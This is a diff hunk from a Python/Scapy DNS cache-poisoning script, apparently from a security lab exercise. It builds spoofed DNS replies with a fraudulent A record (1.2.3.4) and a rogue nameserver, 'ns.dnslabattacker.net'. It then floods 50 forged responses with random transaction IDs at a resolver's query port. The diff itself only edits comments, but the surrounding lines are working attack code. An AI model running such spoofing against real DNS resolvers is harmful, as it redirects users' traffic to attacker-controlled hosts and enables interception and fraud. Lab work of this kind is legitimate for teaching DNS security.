@@ -80,12 +80,11 @@ def sendFakeReplies(query):
         # answer with fraudulent ip (exp. rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151')
         an=DNSRR(rrname=query, type="A", rclass="IN", ttl=3600, rdata="1.2.3.4"), # use large TTL
         # provide the fraudulent name server
-        ns=DNSRR(rrname=request_domain, type="NS", ttl=3600, rdata="ns.dnslabattacker.net") # should need TTL I think
-        # ns=DNSRR(rrname=request_domain, type="NS", rdata="ns.dnslabattacker.net") # should need TTL I think
+        ns=DNSRR(rrname=request_domain, type="NS", ttl=3600, rdata="ns.dnslabattacker.net") # also needs TTL
     )
     print('Sending fake responses ...')
     for i in range(50):
-        spoofReply[DNS].id = getRandomTXID() # TODO: you might repeat TXID?
+        spoofReply[DNS].id = getRandomTXID()
         sendPacket(sock, spoofReply, my_ip, my_query_port) # flood listening port
     return
 
